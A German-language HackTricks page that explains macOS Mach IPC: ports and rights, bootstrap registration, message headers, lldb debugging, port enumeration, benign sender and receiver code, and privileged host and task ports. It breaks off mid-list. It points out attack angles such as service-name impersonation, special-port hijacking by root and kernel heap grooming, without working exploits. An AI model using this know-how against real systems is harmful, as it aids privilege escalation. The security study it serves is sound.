# macOS IPC - Interprozesskommunikation

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Grundlegende Informationen

Mach verwendet **Tasks** als **kleinste Einheit** zum Teilen von Ressourcen, und jeder Task kann **mehrere Threads** enthalten. Diese **Tasks und Threads sind 1:1 auf POSIX-Prozesse und -Threads abgebildet**.

Die Kommunikation zwischen Tasks erfolgt über Mach Inter-Process Communication (IPC) unter Verwendung unidirektionaler Kommunikationskanäle. **Nachrichten werden zwischen Ports übertragen**, die als eine Art vom Kernel verwaltete **Nachrichtenwarteschlangen** fungieren.

Ein **Port** ist das **grundlegende** Element von Mach IPC. Er kann zum **Senden und Empfangen** von Nachrichten verwendet werden.

Jeder Prozess verfügt über eine **IPC-Tabelle**, in der die **Mach-Ports des Prozesses** zu finden sind. Der Name eines Mach-Ports ist tatsächlich eine Zahl (ein Zeiger auf das Kernel-Objekt).

Ein Prozess kann außerdem einen Portnamen mit bestimmten Rechten **an einen anderen Task** senden, woraufhin der Kernel diesen Eintrag in der **IPC-Tabelle des anderen Tasks** erscheinen lässt.

### Port Rights

Port Rights, die festlegen, welche Operationen ein Task durchführen kann, sind für diese Kommunikation entscheidend. Die möglichen **Port Rights** sind ([Definitionen von hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, das den Empfang von an den Port gesendeten Nachrichten ermöglicht. Mach-Ports sind MPSC-Warteschlangen (multiple-producer, single-consumer). Das bedeutet, dass es im gesamten System immer nur **ein Receive right für jeden Port** geben darf (anders als bei Pipes, bei denen mehrere Prozesse gleichzeitig File Descriptors für das Leseende einer Pipe besitzen können).
- Ein **Task mit dem Receive right** kann Nachrichten empfangen und **Send rights erstellen**, die das Senden von Nachrichten ermöglichen. Ursprünglich besitzt nur der **eigene Task das Receive right für seinen Por**t.
- Wenn der Besitzer des Receive right **stirbt** oder den Port beendet, wird das **Send right unbrauchbar (dead name)**.
- **Send right**, das das Senden von Nachrichten an den Port ermöglicht.
- Das Send right kann **geklont** werden, sodass ein Task, der ein Send right besitzt, dieses klonen und **einem dritten Task gewähren** kann.
- Beachte, dass **Port Rights** auch über Mach Messages **übertragen** werden können.
- **Send-once right**, das das Senden einer Nachricht an den Port ermöglicht und anschließend verschwindet.
- Dieses Recht kann **nicht** **geklont**, aber **verschoben** werden.
- **Port set right**, das ein _Port set_ anstelle eines einzelnen Ports bezeichnet. Das Entfernen einer Nachricht aus einem Port set entfernt eine Nachricht aus einem der darin enthaltenen Ports. Port sets können verwendet werden, um gleichzeitig auf mehreren Ports zu lauschen, ähnlich wie `select`/`poll`/`epoll`/`kqueue` unter Unix.
- **Dead name**, das kein tatsächliches Port right, sondern lediglich ein Platzhalter ist. Wenn ein Port zerstört wird, werden alle bestehenden Port Rights für diesen Port zu dead names.

**Tasks können SEND rights an andere übertragen**, wodurch diese Nachrichten zurücksenden können. **SEND rights können auch geklont werden, sodass ein Task das Recht duplizieren und einem dritten Task geben kann**. Dies ermöglicht zusammen mit einem als **bootstrap server** bezeichneten Vermittlungsprozess eine effektive Kommunikation zwischen Tasks.

### File Ports

File ports ermöglichen die Kapselung von File Descriptors in Mach-Ports (mithilfe von Mach Port Rights). Es ist möglich, mit `fileport_makeport` aus einem bestimmten File Descriptor einen `fileport` zu erstellen und mit `fileport_makefd` aus einem `fileport` einen File Descriptor zu erstellen.

### Herstellen einer Kommunikation

Wie bereits erwähnt, ist es möglich, Rights mithilfe von Mach Messages zu senden. Allerdings kann man ein Recht **nicht senden, ohne bereits ein Recht zum Senden einer Mach Message zu besitzen**. Wie wird also die erste Kommunikation hergestellt?

Hier kommt der **bootstrap server** (**launchd** unter macOS) ins Spiel. Da **jeder ein SEND right für den bootstrap server erhalten kann**, ist es möglich, ihn nach einem Recht zum Senden einer Nachricht an einen anderen Prozess zu fragen:

1. Task **A** erstellt einen **neuen Port** und erhält das **RECEIVE right** dafür.
2. Task **A**, als Inhaber des RECEIVE right, **erzeugt ein SEND right für den Port**.
3. Task **A** stellt eine **Verbindung** mit dem **bootstrap server** her und **sendet ihm das SEND right** für den zu Beginn erzeugten Port.
- Denke daran, dass jeder ein SEND right für den bootstrap server erhalten kann.
4. Task A sendet dem bootstrap server eine `bootstrap_register`-Nachricht, um den angegebenen Port mit einem Namen wie `com.apple.taska` **zu verknüpfen**.
5. Task **B** interagiert mit dem **bootstrap server**, um eine Bootstrap-**Suche nach dem Servicenamen** (`bootstrap_lookup`) durchzuführen. Damit der bootstrap server antworten kann, sendet Task B ihm innerhalb der Lookup-Nachricht ein **SEND right für einen zuvor erstellten Port**. Wenn die Suche erfolgreich ist, **dupliziert der Server das von Task A empfangene SEND right** und **überträgt es an Task B**.
- Denke daran, dass jeder ein SEND right für den bootstrap server erhalten kann.
6. Mit diesem SEND right kann **Task B** eine **Nachricht** **an Task A senden**.
7. Für eine bidirektionale Kommunikation erstellt **Task B** normalerweise einen neuen Port mit einem **RECEIVE** right und einem **SEND** right und übergibt das **SEND right an Task A**, damit dieser Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Der bootstrap server **kann den von einem Task beanspruchten Servicenamen nicht authentifizieren**. Das bedeutet, dass ein **Task** potenziell **jeden System-Task imitieren** könnte, beispielsweise indem er fälschlicherweise **einen Authorization-Service-Namen beansprucht** und anschließend jede Anfrage genehmigt.

Apple speichert daher die **Namen der vom System bereitgestellten Services** in sicheren Konfigurationsdateien, die sich in **SIP-geschützten** Verzeichnissen befinden: `/System/Library/LaunchDaemons` und `/System/Library/LaunchAgents`. Neben jedem Servicenamen wird auch die **zugehörige Binary gespeichert**. Der bootstrap server erstellt und hält ein **RECEIVE right für jeden dieser Servicenamen**.

Bei diesen vordefinierten Services unterscheidet sich der **Lookup-Prozess** geringfügig. Wenn nach einem Servicenamen gesucht wird, startet launchd den Service dynamisch. Der neue Ablauf sieht wie folgt aus:

- Task **B** initiiert eine Bootstrap-**Suche** nach einem Servicenamen.
- **launchd** prüft, ob der Task ausgeführt wird, und **startet** ihn, falls dies nicht der Fall ist.
- Task **A** (der Service) führt einen **Bootstrap-Check-in** (`bootstrap_check_in()`) durch. Dabei erstellt der **bootstrap** server ein SEND right, behält es und **überträgt das RECEIVE right an Task A**.
- launchd dupliziert das **SEND right und sendet es an Task B**.
- Task **B** erstellt einen neuen Port mit einem **RECEIVE** right und einem **SEND** right und übergibt das **SEND right an Task A** (den svc), damit dieser Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Dieser Prozess gilt jedoch nur für vordefinierte System-Tasks. Nicht-System-Tasks funktionieren weiterhin wie ursprünglich beschrieben, was potenziell eine Imitation ermöglichen könnte.

> [!CAUTION]
> Daher sollte launchd niemals abstürzen, da sonst das gesamte System abstürzt.

### Eine Mach Message

[Weitere Informationen hier](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

Die im Wesentlichen einem Systemaufruf entsprechende Funktion `mach_msg` wird zum Senden und Empfangen von Mach Messages verwendet. Die Funktion erwartet als erstes Argument die zu sendende Message. Diese Message muss mit einer Struktur vom Typ `mach_msg_header_t` beginnen, auf die der eigentliche Nachrichteninhalt folgt. Die Struktur ist wie folgt definiert:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Prozesse, die ein _**receive right**_ besitzen, können Nachrichten über einen Mach-Port empfangen. Umgekehrt erhalten die **senders** ein _**send**_ oder ein _**send-once right**_. Das send-once right dient ausschließlich zum Senden einer einzelnen Nachricht und wird danach ungültig.<sup>[[11]](#references)</sup>

Das erste Feld **`msgh_bits`** ist eine Bitmap:

- Das erste Bit (höchstwertig) wird verwendet, um anzuzeigen, dass eine Nachricht komplex ist (mehr dazu weiter unten)
- Das 3. und 4. Bit werden vom Kernel verwendet
- Die **5 niederwertigsten Bits des 2. Bytes** können für **voucher** verwendet werden: einen anderen Port-Typ zum Senden von Schlüssel/Wert-Kombinationen.
- Die **5 niederwertigsten Bits des 3. Bytes** können für **local port** verwendet werden
- Die **5 niederwertigsten Bits des 4. Bytes** können für **remote port** verwendet werden

Die Typen, die in den voucher-, local- und remote-Ports angegeben werden können, sind (aus [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Zum Beispiel kann `MACH_MSG_TYPE_MAKE_SEND_ONCE` verwendet werden, um **anzuzeigen**, dass ein **send-once**-**right** für diesen Port abgeleitet und übertragen werden soll. Es kann auch `MACH_PORT_NULL` angegeben werden, um zu verhindern, dass der Empfänger antworten kann.

Um eine einfache **bi-directional communication** zu erreichen, kann ein Prozess einen **mach port** im mach-**message header** angeben, der als _reply port_ (**`msgh_local_port`**) bezeichnet wird und über den der **receiver** der Nachricht eine **reply** auf diese Nachricht **senden** kann.

> [!TIP]
> Beachte, dass diese Art der bi-direktionalen Kommunikation in XPC messages verwendet wird, die eine reply erwarten (`xpc_connection_send_message_with_reply` und `xpc_connection_send_message_with_reply_sync`). **Normalerweise werden jedoch unterschiedliche Ports erstellt**, wie zuvor erklärt, um die bi-direktionale Kommunikation zu erstellen.

Die anderen Felder des message headers sind:

- `msgh_size`: die Größe des gesamten Pakets.
- `msgh_remote_port`: der Port, an den diese Nachricht gesendet wird.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: die ID dieser Nachricht, die vom Empfänger interpretiert wird.

> [!CAUTION]
> Beachte, dass **mach messages über einen `mach port` gesendet werden**, der ein in den mach kernel integrierter Kommunikationskanal mit **einem Empfänger** und **mehreren Sendern** ist. **Mehrere Prozesse** können **messages** an einen mach port **senden**, aber zu jedem Zeitpunkt kann nur **ein einzelner Prozess** daraus **lesen**.

Messages werden anschließend durch den **`mach_msg_header_t`**-Header, gefolgt vom **body** und vom **trailer** (falls vorhanden), gebildet und können die Berechtigung erteilen, darauf zu antworten. In diesen Fällen muss der kernel die Nachricht lediglich von einer task an eine andere weiterleiten.

Ein **trailer** besteht aus **Informationen, die vom kernel zur message hinzugefügt werden** (und vom Benutzer nicht gesetzt werden können). Diese Informationen können beim Empfang der message mit den Flags `MACH_RCV_TRAILER_<trailer_opt>` angefordert werden (es können verschiedene Informationen angefordert werden).

#### Complex Messages

Es gibt jedoch weitere, **komplexere** messages, etwa solche, die zusätzliche port rights übertragen oder memory teilen. In diesen Fällen muss der kernel diese Objekte ebenfalls an den Empfänger senden. In diesen Fällen wird das höchstwertige Bit des Headers `msgh_bits` gesetzt.

Die möglichen Deskriptoren für die Übertragung sind in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup> definiert.
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Bei 32 Bit sind alle Deskriptoren 12 Byte groß, und der Deskriptortyp befindet sich im 11. Byte. Bei 64 Bit variieren die Größen.

> [!CAUTION]
> Der Kernel kopiert die Deskriptoren von einer Task in eine andere, erstellt zuvor jedoch **eine Kopie im Kernel-Speicher**. Diese als „Feng Shui“ bekannte Technik wurde in mehreren Exploits missbraucht, um den **Kernel dazu zu bringen, Daten in seinen Speicher zu kopieren**, indem ein Prozess Deskriptoren an sich selbst sendet. Anschließend kann der Prozess die Nachrichten empfangen (der Kernel gibt sie frei).
>
> Es ist auch möglich, **Port-Rechte an einen verwundbaren Prozess zu senden**; die Port-Rechte erscheinen dann einfach im Prozess (selbst wenn er sie nicht verarbeitet).

### Mac Ports APIs

Beachte, dass Ports dem Task-Namespace zugeordnet sind. Um einen Port zu erstellen oder zu suchen, wird daher auch der Task-Namespace abgefragt (mehr dazu in `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Erstellt** einen Port.
- `mach_port_allocate` kann auch ein **port set** erstellen: ein Empfangsrecht für eine Gruppe von Ports. Beim Empfang einer Nachricht wird angegeben, von welchem Port sie stammt.
- `mach_port_allocate_name`: Ändert den Namen des Ports (standardmäßig eine 32-Bit-Ganzzahl).
- `mach_port_names`: Ruft Portnamen von einem Ziel ab.
- `mach_port_type`: Ruft die Rechte einer Task über einen Namen ab.
- `mach_port_rename`: Benennt einen Port um (wie `dup2` für FDs).
- `mach_port_allocate`: Reserviert einen neuen RECEIVE, PORT_SET oder DEAD_NAME.
- `mach_port_insert_right`: Erstellt ein neues Recht in einem Port, für den du RECEIVE besitzt.
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funktionen zum **Senden und Empfangen von Mach-Nachrichten**. Die Overwrite-Version ermöglicht die Angabe eines anderen Puffers für den Nachrichtenempfang (die andere Version verwendet einfach denselben Puffer erneut).

### Debug mach_msg

Da die Funktionen **`mach_msg`** und **`mach_msg_overwrite`** zum Senden und Empfangen von Nachrichten verwendet werden, kannst du durch das Setzen eines Breakpoints auf ihnen die gesendeten und empfangenen Nachrichten untersuchen.

Starte zum Beispiel das Debugging einer beliebigen Anwendung, die du debuggen kannst, da sie **`libSystem.B` laden wird, die diese Funktion verwendet**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Um die Argumente von **`mach_msg`** zu erhalten, überprüfe die Register. Dies sind die Argumente (aus [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Rufen Sie die Werte aus den Registries ab:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Untersuche den Nachrichten-Header und überprüfe das erste Argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Dieser Typ von `mach_msg_bits_t` ist sehr üblich, um eine Antwort zu ermöglichen.

### Ports enumerieren
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Der **Name** ist der standardmäßig für den Port vergebene Name (beachte, wie er in den ersten 3 Bytes **ansteigt**). Das **`ipc-object`** ist der **verschleierte** eindeutige **Bezeichner** des Ports.\
Beachte außerdem, wie die Ports mit ausschließlich **`send`**-Berechtigung den **Besitzer** identifizieren (Portname + PID).\
Beachte auch die Verwendung von **`+`**, um **andere Tasks zu kennzeichnen, die mit demselben Port verbunden sind**.

Es ist auch möglich, [**procesxp**](https://www.newosxbook.com/tools/procexp.html) zu verwenden, um zusätzlich die **registrierten Servicenamen** anzuzeigen (mit deaktiviertem SIP, da `com.apple.system-task-port` benötigt wird):
```
procesp 1 ports
```
Du kannst dieses Tool unter iOS installieren, indem du es von [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) herunterlädst.

### Codebeispiel

Beachte, wie der **Sender** einen Port **allokiert**, ein **send right** für den Namen `org.darlinghq.example` erstellt und es an den **bootstrap server** sendet, während der Sender das **send right** dieses Namens anfordert und es zum **Senden einer Nachricht** verwendet.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privilegierte Ports

Einige spezielle Ports ermöglichen es einer Aufgabe, **bestimmte sensible Aktionen auszuführen oder auf bestimmte sensible Daten zuzugreifen**, wenn sie **SEND**-Rechte über diese Ports besitzt. Diese Ports sind aus Sicht eines Angreifers interessant, und zwar sowohl wegen ihrer Fähigkeiten als auch wegen der Möglichkeit, **SEND-Rechte zwischen Aufgaben zu teilen**.

### Spezielle Host-Ports

Diese Ports werden durch eine Zahl dargestellt.

**SEND**-Rechte können durch den Aufruf von **`host_get_special_port`** und **RECEIVE**-Rechte durch den Aufruf von **`host_set_special_port`** erlangt werden. Beide Aufrufe erfordern jedoch den **`host_priv`**-Port, auf den nur root zugreifen kann. Außerdem konnte root in der Vergangenheit **`host_set_special_port`** aufrufen und beliebige Ports hijacken, was beispielsweise das Umgehen von Code-Signaturen durch das Hijacking von `HOST_KEXTD_PORT` ermöglichte (SIP verhindert dies inzwischen).

Diese werden in 2 Gruppen unterteilt: Die **ersten 7 Ports gehören dem Kernel**, wobei 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` und 7 `HOST_MAX_SPECIAL_KERNEL_PORT` ist.\
Die Ports ab der Nummer **8** **gehören System-Daemons** und sind in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) deklariert.

- **Host port**: Wenn ein Prozess **SEND**-Berechtigungen über diesen Port besitzt, kann er durch den Aufruf seiner Routinen **Informationen** über das **System** abrufen, zum Beispiel:
- `host_processor_info`: Prozessorinformationen abrufen
- `host_info`: Host-Informationen abrufen
- `host_virtual_physical_table_info`: Virtuelle/physische Seitentabelle (erfordert MACH_VMDEBUG)
- `host_statistics`: Host-Statistiken abrufen
- `mach_memory_info`: Layout des Kernel-Speichers abrufen
- **Host Priv port**: Ein Prozess mit einem **SEND**-Recht über diesen Port kann **privilegierte Aktionen** ausführen, beispielsweise Boot-Daten anzeigen oder versuchen, eine Kernel-Erweiterung zu laden. Der **Prozess muss root sein**, um diese Berechtigung zu erhalten.
- Außerdem sind für den Aufruf der **`kext_request`**-API weitere Entitlements **`com.apple.private.kext*`** erforderlich, die nur Apple-Binaries erteilt werden.
- Weitere Routinen, die aufgerufen werden können, sind:
- `host_get_boot_info`: `machine_boot_info()` abrufen
- `host_priv_statistics`: Privilegierte Statistiken abrufen
- `vm_allocate_cpm`: Zusammenhängenden physischen Speicher zuweisen
- `host_processors`: SEND-Recht an Host-Prozessoren
- `mach_vm_wire`: Speicher resident machen
- Da **root** auf diese Berechtigung zugreifen kann, könnte es `host_set_[special/exception]_port[s]` aufrufen, um **spezielle Host- oder Exception-Ports zu hijacken**.

Es ist möglich, **alle speziellen Host-Ports anzuzeigen**, indem man Folgendes ausführt:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Diese Ports sind für bekannte Dienste reserviert. Sie können durch Aufruf von `task_[get/set]_special_port` abgerufen bzw. gesetzt werden. Sie sind in `task_special_ports.h` zu finden:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Der Port, der zur Kontrolle dieses Tasks verwendet wird. Wird verwendet, um Nachrichten zu senden, die den Task beeinflussen. Dies ist der von **mach_task_self (siehe Task-Ports weiter unten)** zurückgegebene Port.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Der Bootstrap-Port des Tasks. Wird verwendet, um Nachrichten zu senden, mit denen die Rückgabe anderer Systemdienst-Ports angefordert wird.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Der Port, der zum Anfordern von Informationen über den enthaltenen Host verwendet wird. Dies ist der von **mach_host_self** zurückgegebene Port.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Der Port, der die Quelle bezeichnet, aus der dieser Task seinen verdrahteten Kernel-Speicher bezieht.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Der Port, der die Quelle bezeichnet, aus der dieser Task seinen standardmäßig verwalteten Speicher bezieht.

### Task-Ports

Ursprünglich hatte Mach keine „Prozesse“, sondern „Tasks“, die eher als Container für Threads betrachtet wurden. Als Mach mit BSD zusammengeführt wurde, **wurde jeder Task einem BSD-Prozess zugeordnet**. Daher verfügt jeder BSD-Prozess über die für einen Prozess erforderlichen Details, und jeder Mach-Task besitzt ebenfalls seine internen Abläufe (mit Ausnahme der nicht vorhandenen PID 0, der `kernel_task` ist).

Es gibt zwei sehr interessante Funktionen, die damit zusammenhängen:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Ermittelt ein SEND-Recht für den Task-Port des Tasks, der der angegebenen `pid` zugeordnet ist, und übergibt es an den angegebenen `target_task_port` (dies ist normalerweise der aufrufende Task, der `mach_task_self()` verwendet, könnte aber auch ein SEND-Port über einen anderen Task sein).
- `pid_for_task(task, &pid)`: Ermittelt anhand eines SEND-Rechts auf einen Task, welcher PID dieser Task zugeordnet ist.

Um Aktionen innerhalb des Tasks auszuführen, benötigte der Task ein `SEND`-Recht auf sich selbst, indem er `mach_task_self()` aufrief (das den `task_self_trap` (28) verwendet). Mit dieser Berechtigung kann ein Task verschiedene Aktionen ausführen, zum Beispiel:

